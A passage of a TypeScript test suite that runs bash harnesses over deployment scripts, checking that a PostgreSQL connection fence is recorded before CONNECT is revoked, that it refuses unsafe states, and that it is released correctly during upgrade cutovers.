DB_FENCE_REFENCE_CMD="\${DB_FENCE_REFENCE_WRAPPER}"
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
info() { :; }
ok() { :; }
warn() { echo "WARN: $*"; }
die() { echo "DIE: $*" >&2; exit 1; }
as_app_user() { "$@"; }
chown() { :; }
`,
  },
  {
    name: 'update.sh',
    source: UPDATE_LINES.join('\n'),
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
APP_USER="$(id -un)"
# o3d-secops r22: the connection-fence directory is walked to beneath a root-owned parent
# now, so a rig that names it must name the parent it hangs off as well.
CUTOVER_STATE_DIR="${'${CUTOVER_STATE_DIR:-'}${dir}}"
CUTOVER_ROOT_DIR='${dir}'
DB_FENCE_DIR='${dir}/fence'
# o3d-secops r28: the recovery wrappers this rig's resolver publishes now take the entrypoint's
# own cutover lock for their whole read/audit/act sequence, so the entrypoint hands them its path
# and a rig that omitted it would be measuring a publication the shipped script cannot perform.
LOCK_FILE='${dir}/cutover.lock'
LEGACY_STATE_DIR_DB_FENCE_STATE="${'${CUTOVER_STATE_DIR}'}/deploy/db-connect-fence.json"
DB_FENCE_SCRIPT='${dir}/app/scripts/fence-db-connections.mjs'
DB_FENCE_STATE='${dir}/db-connect-fence.json'
DATABASE_URL='postgres://app@127.0.0.1/nowhere'
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@127.0.0.1/nowhere'
MIGRATION_DATABASE_URL=''
DB_FENCE_UP=false
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
# o3d-2sm1.5 r29/r30: the recovery record and the root-owned copy of the fence script. Both paths
# are under the harness directory rather than /etc. As of r30 the copy is what actually RUNS — the
# checkout's script is published into it and never executed in place — so these harnesses let that
# publication happen for real. The stub written into the fake checkout logs to an ABSOLUTE
# ${dir}/calls.log, so the copy of it records the same calls at the same place and every
# assertion below still reads what was invoked.
${fenceProtectedLibrary(dir)}
${shellFunction(UPDATE_LINES.join('\n'), 'resolve_fence_script')}
${shellFunction(CUTOVER_NS_LIB, 'dir_is_private_to_this_run')}
${shellFunction(UPDATE_LINES.join('\n'), 'db_fence_helper')}
# o3d-secops r32: and the three the migration binding is made of -- the drop to the application
# account carrying MIGRATION_DATABASE_URL, and the two gates that read db_fence_migration_bind() and
# db_fence_migration_witnessed(). Lifted rather than stubbed for the reason everything else
# here is: fence_db_connections() CALLS the first of them, so a rig without it would measure
# an ordering the shipped script does not have.
${shellFunction(UPDATE_LINES.join('\n'), 'db_fence_migration_helper')}
${shellFunction(UPDATE_LINES.join('\n'), 'bind_migration_to_fenced_server')}
${shellFunction(UPDATE_LINES.join('\n'), 'require_migration_landed_on_fenced_server')}
${shellFunction(UPDATE_LINES.join('\n'), 'pin_migration_window')}
DB_FENCE_REFENCE_CMD="\${DB_FENCE_REFENCE_WRAPPER}"
DB_FENCE_IDENTITY_FROM_RECORD=false
DB_FENCE_ADOPTING=false
DB_FENCE_RECOVERY_REASON=''
DB_FENCE_IDENTITY_MISMATCH=''
# The four values themselves, which require_adoption_identity() reads to COMPARE the file's answer
# against the record's (o3d-2sm1.5 r30). Empty here: these harnesses are about order, and which
# source wins is exercised against real files in the recovery tests below.
DB_IDENTITY_HOST=''; DB_IDENTITY_PORT=''; DB_IDENTITY_USER=''; DB_IDENTITY_DATABASE=''
DB_IDENTITY_PINNED_HOST=''; DB_IDENTITY_PINNED_PORT=''; DB_IDENTITY_PINNED_USER=''; DB_IDENTITY_PINNED_DATABASE=''
# THE REAL RESOLVER, not a stub: WHICH script a fence, a release and a re-fence invoke is part of
# what these harnesses assert, and a stub returning a constant would assert nothing about it.
${durabilityFunctions(UPDATE_LINES.join('\n'))}
${shellFunction(UPDATE_LINES.join('\n'), 'require_adoption_identity')}
${shellFunction(UPDATE_LINES.join('\n'), 'refuse_adoption_identity_mismatch')}
# Publishing that record writes under a root-owned /etc directory, which is neither what these
# order harnesses are about nor something they may do. It is exercised for real, against the
# shipped function, in 'the identity a fence records is the identity a recovery reads back'.
publish_fence_recovery_record() { return 0; }
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
info() { :; }
success() { :; }
warn() { echo "WARN: $*"; }
die() { echo "DIE: $*" >&2; exit 1; }
run_as_user() { shift; "$@"; }
chown() { :; }
`,
  },
  {
    name: 'install.sh',
    source: INSTALL_SOURCE,
    preamble: (dir: string) => `
# THE REAL CRONTAB EXCLUSION, SOURCED RATHER THAN STUBBED (o3d-p9dq). Every fence, unfence,
# adoption and unwind lifted into these harnesses performs its read-modify-write through
# with_crontab_lock, so a harness that stubbed it out would be measuring an ordering the shipped
# code no longer has. The lock file is created directly because prepare_crontab_lock needs root;
# its preparation is exercised in tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
APP_USER="$(id -un)"
APP_DIR='${dir}'
# o3d-secops r22: the connection-fence directory is walked to beneath a root-owned parent
# now, so a rig that names it must name the parent it hangs off as well.
CUTOVER_STATE_DIR="${'${CUTOVER_STATE_DIR:-'}${dir}}"
CUTOVER_ROOT_DIR='${dir}'
DB_FENCE_DIR='${dir}/fence'
# o3d-secops r28: the recovery wrappers this rig's resolver publishes now take the entrypoint's
# own cutover lock for their whole read/audit/act sequence, so the entrypoint hands them its path
# and a rig that omitted it would be measuring a publication the shipped script cannot perform.
LOCK_FILE='${dir}/cutover.lock'
LEGACY_STATE_DIR_DB_FENCE_STATE="${'${CUTOVER_STATE_DIR}'}/deploy/db-connect-fence.json"
DB_FENCE_SCRIPT='${dir}/app/scripts/fence-db-connections.mjs'
DB_FENCE_STATE='${dir}/db-connect-fence.json'
DATABASE_URL='postgres://app@127.0.0.1/nowhere'
DEPLOY_ADMIN_DATABASE_URL='postgres://admin@127.0.0.1/nowhere'
MIGRATION_DATABASE_URL=''
DB_FENCE_UP=false
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
# o3d-2sm1.5 r31: this entrypoint no longer executes the checkout's fence helper from its own path
# either — it resolves every invocation through the SHARED library, sourced here for real and then
# pointed at the harness directory instead of /etc.
${fenceProtectedLibrary(dir)}
${shellFunction(INSTALL_SOURCE, 'resolve_fence_script')}
${shellFunction(CUTOVER_NS_LIB, 'dir_is_private_to_this_run')}
${shellFunction(INSTALL_SOURCE, 'db_fence_helper')}
# o3d-secops r32: and the three the migration binding is made of -- the drop to the application
# account carrying MIGRATION_DATABASE_URL, and the two gates that read db_fence_migration_bind() and
# db_fence_migration_witnessed(). Lifted rather than stubbed for the reason everything else
# here is: fence_db_connections() CALLS the first of them, so a rig without it would measure
# an ordering the shipped script does not have.
${shellFunction(INSTALL_SOURCE, 'db_fence_migration_helper')}
${shellFunction(INSTALL_SOURCE, 'bind_migration_to_fenced_server')}
${shellFunction(INSTALL_SOURCE, 'require_migration_landed_on_fenced_server')}
${shellFunction(INSTALL_SOURCE, 'pin_migration_window')}
# o3d-2sm1.5 r35: install.sh's resolver refuses outright on a FIRST INSTALL, which performs no
# credentialed fence execution. Every harness below is an UPGRADE cutover — that is what they are
# for — so the flag is named here with the value the upgrade branch runs under. Named rather than
# defaulted inside the shipped function: an interlock with a default is an interlock a slice can
# lose without noticing, and an unbound-variable abort is how a harness discovers it exists at
# all. The first-install value is exercised for real in
# tests/scripts/fence-digest-and-first-install.test.ts.
FIRST_INSTALL_NO_CREDENTIALED_FENCE=false
DB_FENCE_REFENCE_CMD="\${DB_FENCE_REFENCE_WRAPPER}"
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
info() { :; }
success() { :; }
warn() { echo "WARN: $*"; }
error() { echo "ERROR: $*" >&2; }
die() { echo "DIE: $*" >&2; exit 1; }
run_as_user() { shift; "$@"; }
chown() { :; }
`,
  },
] as const

for (const entry of FENCE_HARNESS) {
  test(`${entry.name} exits non-zero when the fence script reports CONNECT was not revoked`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-fence3-'))
    try {
      writeFenceCheckout(dir, 'process.exit(3)\n')
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        CUTOVER_DIR_PRIMITIVES,
        CUTOVER_DIR_PRIMITIVES,
      shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'echo "REACHED THE MIGRATION"',
      ].join('\n')

      let status = 0
      let output = ''
      try {
        output = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
      } catch (error) {
        const failure = error as { status?: number; stdout?: string; stderr?: string }
        status = failure.status ?? -1
        output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`
      }

      assert.notEqual(status, 0, 'exit 3 from the fence script must abort the cutover')
      assert.ok(!output.includes('REACHED THE MIGRATION'), 'and nothing after it may run')
      assert.match(output, /COULD NOT BE FENCED/, 'and it must say the database is not held closed')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} publishes the authority before it revokes, and root clears it after the release`, () => {
    /**
     * o3d-secops r23, Codex CRITICAL — THE WHOLE CYCLE, THROUGH THE SHIPPED SHELL.
     *
     * The ordering property the helper used to own is now the caller's: a REVOKE is a committed
     * transaction that outlives a power cut, this record is the only thing that undoes it, and so
     * the record has to be DURABLE BEFORE the revoke is issued. db_fence_raise() plans, hands the
     * plan to the privileged validator, and only then invokes `--fence`.
     *
     * OBSERVED AT THE HELPER, not asserted from the source: the stub records, for each mode, what
     * was at the authority path at the moment it ran. A publication ordered after the revoke would
     * show `--fence` running with nothing there.
     */
    const dir = mkdtempSync(join(tmpdir(), 'ims-fence-cycle-'))
    try {
      const log = join(dir, 'modes.json')
      // THE STUB IS WRITTEN OVER writeFenceCheckout()'s, not appended to it: the shared plan
      // responder exits on `--plan` before anything else runs, and what this test is measuring is
      // the ORDER of the three invocations, so it has to see that one too.
      const helper = writeFenceCheckout(dir, '')
      writeFileSync(helper, [
        "import { appendFileSync, existsSync, readFileSync } from 'node:fs'",
        "const state = process.argv.find((a) => a.startsWith('--state-file='))?.slice('--state-file='.length) ?? ''",
        `appendFileSync(${JSON.stringify(log)}, JSON.stringify({`,
        "  mode: process.argv.find((a) => a.startsWith('--') && !a.includes('=')),",
        '  authority: existsSync(state) ? JSON.parse(readFileSync(state, "utf8")) : null,',
        "}) + '\\n')",
        "if (process.argv.includes('--plan')) {",
        "  process.stdout.write(JSON.stringify({",
        "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
        "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
        "  }) + '\\n')",
        '}',
        // o3d-secops r32: STAMPED, because the shipped `--print-migration-url` stamps. Root reads the
        // nonce back out of this URL and asks the witness about that value, so a stub that emitted a
        // bare URL would exercise the "this run composed a migration it cannot place" refusal on every
        // ordinary cutover instead of the cutover.
        "if (process.argv.includes('--print-migration-url')) process.stdout.write(`postgres://admin@127.0.0.1/nowhere?application_name=ims-migration-${process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''}\\n`)",
        // THE WITNESS PROTOCOL, EMULATED (o3d-secops r31). The ordinary cutover now holds a session
        // across the fence and the release and asks BOTH connections whether they can see it, so a
        // stub that answered nothing here would be measuring a cutover the shipped scripts do not
        // perform -- and this test's subject is precisely that the ordinary one still ends its own
        // record with nobody at a terminal.
        ...WITNESS_STUB_LINES(),
        'process.exit(0)',
        '',
      ].join('\n'))
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        shellFunction(entry.source, 'release_db_connections'),
        'fence_db_connections',
        'echo "AUTHORITY=$(LC_ALL=C stat -c "%a %u" "${DB_FENCE_STATE}" 2>/dev/null || echo missing)"',
        'release_db_connections || echo "RELEASE_FAILED"',
        '[[ -e "${DB_FENCE_STATE}" ]] && echo AUTHORITY_REMAINS || echo AUTHORITY_CLEARED',
      ].join('\n')
      const output = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })

      const calls = readFileSync(log, 'utf8').split('\n').filter(Boolean).map((line) => JSON.parse(line) as { mode: string; authority: { revoked: string[] } | null })
      const plan = calls.find((call) => call.mode === '--plan')
      const fence = calls.find((call) => call.mode === '--fence')
      const release = calls.find((call) => call.mode === '--release')
      assert.ok(plan, `the helper must be asked for a plan first:\n${output}`)
      assert.equal(plan?.authority, null, 'and it must run before anything is recorded — it is a REQUEST, not a publication')
      assert.ok(fence, `and then asked to fence:\n${output}`)
      assert.deepEqual(fence?.authority?.revoked, ['PUBLIC', 'imsapp'],
        `with the authority already complete on the medium at the moment it revokes:\n${output}`)
      assert.match(output, new RegExp(`^AUTHORITY=644 ${harnessUid()}$`, 'm'),
        `published root-owned and unwritable by the account that executes it:\n${output}`)
      assert.ok(release, `and the release must reach the helper:\n${output}`)
      assert.match(output, /^AUTHORITY_CLEARED$/m,
        `and ROOT removes the record afterwards — the helper cannot, because an unlink is a write to that directory:\n${output}`)
      assert.ok(!/RELEASE_FAILED/.test(output), `and the release must succeed:\n${output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} revokes nothing when the authority cannot be published`, () => {
    /**
     * THE REFUSAL THAT KEEPS THE ASYMMETRY CLOSED, at the layer that now owns it. The plan is
     * computed; the publication cannot be made; and NOTHING is revoked — the helper is never
     * invoked with `--fence` at all.
     *
     * ROUTE: the shipped db_fence_raise() -> db_fence_publish_authority(), refused because the
     * destination directory is not one only this run may write. That is the same question the
     * validator asks in the process that does the rename; this one refuses before `node` starts,
     * so the message names the namespace.
     */
    const dir = mkdtempSync(join(tmpdir(), 'ims-fence-unrecordable-'))
    try {
      const log = join(dir, 'modes.log')
      // Written OVER the shared stub, which answers `--plan` and exits before anything else can
      // record that it was asked — and what this test is measuring is which modes ran at all.
      const helper = writeFenceCheckout(dir, '')
      writeFileSync(helper, [
        "import { appendFileSync } from 'node:fs'",
        `appendFileSync(${JSON.stringify(log)}, process.argv.slice(2).join(' ') + '\\n')`,
        "if (process.argv.includes('--plan')) {",
        "  process.stdout.write(JSON.stringify({",
        "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
        "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
        "  }) + '\\n')",
        '}',
        'process.exit(0)',
        '',
      ].join('\n'))
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        // The authority's directory, opened to everybody. On a real host this cannot happen —
        // ${CUTOVER_ROOT_DIR} is created and proved by the namespace library — which is why the
        // refusal has to be exhibited rather than argued: the mechanism must not rest on the mode
        // of a directory being what the previous function left it.
        // Its OWN directory: ensure_cutover_root_dir() re-asserts the mode of ${CUTOVER_ROOT_DIR}
        // on every run, so a mode planted on that one would be corrected before this could
        // measure anything.
        'DB_FENCE_STATE="${CUTOVER_ROOT_DIR}/exposed/db-connect-fence.json"',
        'mkdir -p "${CUTOVER_ROOT_DIR}/exposed"',
        'chmod 777 "${CUTOVER_ROOT_DIR}/exposed"',
        // A SUBSHELL, because `die` is `exit`: without it the refusal ends this rig and the
        // post-conditions below it are never observed.
        '( fence_db_connections ) || echo "FENCE_REFUSED"',
        'echo "CALLS=$(tr "\\n" ";" < ' + JSON.stringify(log) + ' 2>/dev/null || true)"',
      ].join('\n')
      // BOTH STREAMS: the refusal is on stderr, which is where a refusal belongs and where a
      // stdout-only capture would silently stop seeing it.
      const run = spawnSync('bash', ['-c', program], { encoding: 'utf8' })
      const output = `${run.stdout ?? ''}${run.stderr ?? ''}`
      assert.match(output, /--plan/, `the plan must have been computed, or this test measures nothing:\n${output}`)
      assert.ok(!/CALLS=[^\n]*--fence/.test(output),
        `and NOTHING may be revoked when the record that undoes it could not be published:\n${output}`)
      assert.match(output, /not a directory only this run may write/,
        `and the refusal must name what it could not establish:\n${output}`)
      assert.match(output, /Refusing to revoke CONNECT/,
        `and say that this is why nothing was revoked:\n${output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} treats a successful fence as the only way past the drain`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-fence0-'))
    try {
      // The stub answers --print-migration-url the way the real script does, and exits 0 for
      // --fence. Anything else the shell might do with the admin URL is then visible in
      // MIGRATION_DATABASE_URL.
      writeFenceCheckout(
        dir,
        [
          "if (process.argv.includes('--print-migration-url')) {",
          "  process.stdout.write('postgres://admin@127.0.0.1/nowhere?options=-c%20role%3Dimsapp\\n')",
          '}',
          'process.exit(0)',
          '',
        ].join('\n'),
      )
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        CUTOVER_DIR_PRIMITIVES,
        CUTOVER_DIR_PRIMITIVES,
      shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'echo "FENCE_UP=${DB_FENCE_UP} MIGRATION_URL=${MIGRATION_DATABASE_URL}"',
      ].join('\n')
      const output = execFileSync('bash', ['-c', program], { encoding: 'utf8' })
      assert.match(output, /FENCE_UP=true/, 'a fence that took must be recorded as standing')
      assert.match(
        output,
        /MIGRATION_URL=postgres:\/\/admin@/,
        'and the migration must then run through the privileged connection, not the fenced-out one',
      )
      // o3d-2sm1.5 (Codex r4, CRITICAL): the privileged connection is a SUPERUSER (the fence
      // refuses every other fenceable shape), so a migration that merely runs THROUGH it owns
      // everything it creates and the application role gets no grant at all. The URL the shell
      // adopts must be the composed one, carrying the role the migration runs as.
      assert.match(
        output,
        /MIGRATION_URL=[^\s]*options=-c%20role%3Dimsapp/,
        'the migration URL must carry `options=-c role=<app role>`, or the fenced migration creates objects the application cannot use',
      )
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} refuses to migrate when the migration URL cannot be composed`, () => {
    // The fence took, so the application role has no CONNECT and the schema is about to move.
    // Falling back to the bare admin URL here is exactly the defect — it succeeds, and leaves
    // a database the application cannot use. It has to abort while nothing has been migrated.
    const dir = mkdtempSync(join(tmpdir(), 'ims-fenceurl-'))
    try {
      writeFenceCheckout(
        dir,
        ["if (process.argv.includes('--print-migration-url')) process.exit(1)", 'process.exit(0)', ''].join('\n'),
      )
      const program = [
        'set -euo pipefail',
        entry.preamble(dir),
        CUTOVER_DIR_PRIMITIVES,
        CUTOVER_DIR_PRIMITIVES,
      shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'echo "REACHED THE MIGRATION"',
      ].join('\n')

      let status = 0
      let output = ''
      try {
        output = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
      } catch (error) {
        const failure = error as { status?: number; stdout?: string; stderr?: string }
        status = failure.status ?? -1
        output = `${failure.stdout ?? ''}${failure.stderr ?? ''}`
      }

      assert.notEqual(status, 0, 'a migration URL that cannot be composed must abort the cutover')
      assert.ok(!output.includes('REACHED THE MIGRATION'), 'and nothing after it may run')
      assert.match(output, /application cannot use|produced nothing/, 'and it must say why')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 (Codex r12, HIGH) — EVERY ENTRYPOINT SHORT-CIRCUITED THE RELEASE.
//
// Round 11 taught scripts/fence-db-connections.mjs --release to ASK PostgreSQL whether a
// fence is standing when the record cannot answer, because a durable revoke outlives a lost
// record. Every caller then opened with `[[ -f "$DB_FENCE_STATE" ]] || return 0` and never
// invoked it — a file-existence answer in front of the database question, which is the same
// defect the database question was added to fix. The start path took that false success,
// removed the reboot fence and started an application with no CONNECT on its own database.
//
// These run the SHIPPED release function with NO state file against a stub that answers the
// way a real database would, so a reinstated short-circuit fails them rather than reading
// past them: the stub logs every invocation, and a short-circuit produces an empty log.
// ---------------------------------------------------------------------------

/** A stand-in for fence-db-connections.mjs that records its argv and exits how it is told. */
function fenceStub(dir: string, exitCode: number): void {
  writeFenceCheckout(
    dir,
    [
      "import { appendFileSync } from 'node:fs'",
      `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
      `process.exit(${exitCode})`,
      '',
    ].join('\n'),
  )
}

/**
 * A STUB THAT SPEAKS THE r31 WITNESS PROTOCOL (o3d-secops r31, Codex HIGH 1).
 *
 * The shipped helper holds a session across the fence and the release and reports, on each of its
 * OWN connections, whether it can see that session. There is no PostgreSQL in these harnesses, so
 * the three lines root reads are produced directly -- what is under test here is the SHELL: that
 * root issues a challenge, passes it to `--release`, reads the verdict out of the release's own
 * output, and lets that decide whether the record is removed.
 *
 * `verdict` is what `--release` reports. 'yes' is the ordinary cutover; 'no' is a release that
 * landed somewhere the witness is not, which is the whole finding.
 */
function WITNESS_STUB_LINES(
  verdict: 'yes' | 'no' = 'yes',
  extraStdout: string[] = [],
  { sightings = 1, binding = 'colocated' }: { sightings?: number; binding?: 'colocated' | 'absent' } = {},
): string[] {
  return [
    "if (process.argv.includes('--witness')) {",
    "  const nonce = process.argv.find((a) => a.startsWith('--witness-nonce='))?.slice('--witness-nonce='.length) ?? ''",
    "  process.stdout.write(`WITNESS_READY ${nonce}\\n`)",
    "  let buffer = ''",
    "  process.stdin.on('data', (chunk) => {",
    "    buffer += chunk.toString('utf8')",
    "    let index",
    "    while ((index = buffer.indexOf('\\n')) >= 0) {",
    "      const line = buffer.slice(0, index).trim()",
    "      buffer = buffer.slice(index + 1)",
    "      const hit = /^challenge ([0-9a-f]+)$/.exec(line)",
    "      if (hit) process.stdout.write(`WITNESS_HELD ${hit[1]}\\n`)",
    // o3d-secops r32: the migration binding's two commands. `watch` arms the sampler; `sightings`
    // reports how many distinct backends carrying the migration's stamp it has seen since. The
    // count is a parameter so a test can exhibit the case where the migration went elsewhere.
    "      const w = /^watch ([0-9a-f]+)$/.exec(line)",
    "      if (w) process.stdout.write(`WITNESS_WATCHING ${w[1]}\\n`)",
    "      const g = /^sightings ([0-9a-f]+)$/.exec(line)",
    `      if (g) process.stdout.write(\`WITNESS_SIGHTINGS \${g[1]} ${sightings}\\n\`)`,
    "    }",
    "  })",
    // TOP-LEVEL AWAIT RATHER THAN `return`: this stub is an .mjs, so `return` at module scope is a
    // syntax error, and the witness must not fall through to the `process.exit(0)` below it.
    "  await new Promise((resolve) => process.stdin.on('end', resolve))",
    "  process.exit(0)",
    "}",
    // THE r32 GRAMMAR: a whole line, naming the exact nonce the caller passed. The stub reads the
    // nonce off its own argv rather than being told one, so a shell that passed a DIFFERENT nonce
    // to `--release` than it later looked for would be caught here rather than papered over.
    "const lockArg = process.argv.find((a) => a.startsWith('--witness-lock='))?.slice('--witness-lock='.length) ?? ''",
    "const challengeArg = process.argv.find((a) => a.startsWith('--witness-challenge='))?.slice('--witness-challenge='.length) ?? ''",
    // o3d-secops r32: the pre-DDL probe. It reports on the same machine channel, in the same
    // grammar, naming the migration nonce root read back out of the URL it composed -- so a shell
    // that asked about a different nonce than it stamped would fail here rather than pass quietly.
    "const migrationArg = process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''",
    `if (process.argv.includes('--bind-migration')) {`,
    `  process.stdout.write(\`MIGRATION_BINDING \${migrationArg} ${binding}\\n\`)`,
    `  process.exit(${'colocated' === binding ? 0 : 1})`,
    `}`,
    "if (process.argv.includes('--fence') && lockArg) process.stdout.write(`FENCE_WITNESS ${lockArg} colocated\\n`)",
    `if (process.argv.includes('--release') && challengeArg) process.stdout.write(\`RELEASE_WITNESS \${challengeArg} ${verdict === 'yes' ? 'colocated' : 'absent'}\\n\`)`,
    // AND WHATEVER ELSE THE CALLER WANTS ON THE CHANNEL. This is how the hostile-identifier and
    // conflicting-verdict cases below put text on stdout that a substring reader would have taken
    // for a verdict; an empty list is the ordinary cutover and changes nothing.
    ...extraStdout,
  ]
}

function runShell(program: string): { status: number; output: string } {
  try {
    return {
      status: 0,
      output: execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }),
    }
  } catch (error) {
    const failure = error as { status?: number; stdout?: string; stderr?: string }
    return { status: failure.status ?? -1, output: `${failure.stdout ?? ''}${failure.stderr ?? ''}` }
  }
}

function calls(dir: string): string {
  return existsSync(join(dir, 'calls.log')) ? readFileSync(join(dir, 'calls.log'), 'utf8') : ''
}

for (const entry of FENCE_HARNESS) {
  const release = (dir: string, raised: boolean, extra: string[] = []) =>
    [
      'set -euo pipefail',
      entry.preamble(dir),
      // update.sh's release reports through error(); the shared preamble does not define it.
      'error() { echo "ERROR: $*" >&2; }',
      `DB_FENCE_RAISED=${raised}`,
      shellFunction(entry.source, 'release_db_connections'),
      ...extra,
    ].join('\n')

  test(`${entry.name} asks the DATABASE about a fence when no record exists, and refuses when the application has no CONNECT`, () => {
    // The r11 failure exactly: the revoke survived, the record did not. The database says the
    // application role cannot connect (--release exit 1), and the caller must not start it.
    const dir = mkdtempSync(join(tmpdir(), 'ims-rel-nostate-'))
    try {
      fenceStub(dir, 1)
      assert.equal(existsSync(join(dir, 'db-connect-fence.json')), false, 'the record must be absent for this to test anything')

      const result = runShell(release(dir, false, ['release_db_connections', 'echo "RELEASE SAID IT WAS FINE"']))

      // MUTATION ROUTE: put `[[ -f "$DB_FENCE_STATE" ]] || return 0` back at the top of
      // release_db_connections() and BOTH of these fail — the log is empty and the status is 0.
      assert.match(calls(dir), /--release/, 'the release must be RUN, not skipped because a file is missing')
      assert.notEqual(result.status, 0, 'and a database that says the application is locked out must refuse')
      assert.ok(!result.output.includes('RELEASE SAID IT WAS FINE'), 'nothing may treat that as a released fence')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  test(`${entry.name} never calls a fence released when only the application role's own CONNECT was proven`, () => {
    // --release exit 4: no record, and the database confirms only that the application role
    // holds CONNECT. PUBLIC, monitoring, backup, BI or a second application may still be
    // revoked by the same fence, so this run continues but never says "released".
    const dir = mkdtempSync(join(tmpdir(), 'ims-rel-unproven-'))
    try {
      fenceStub(dir, 4)
      const result = runShell(release(dir, false, ['release_db_connections', 'echo "CONTINUED"']))

      // MUTATION ROUTE: reinstate the `[[ -f ... ]] || return 0` short-circuit and the first
      // two assertions fail (empty log, no warning). Delete the exit-4 arm so 4 falls through
      // to the generic refusal and 'CONTINUED' disappears.
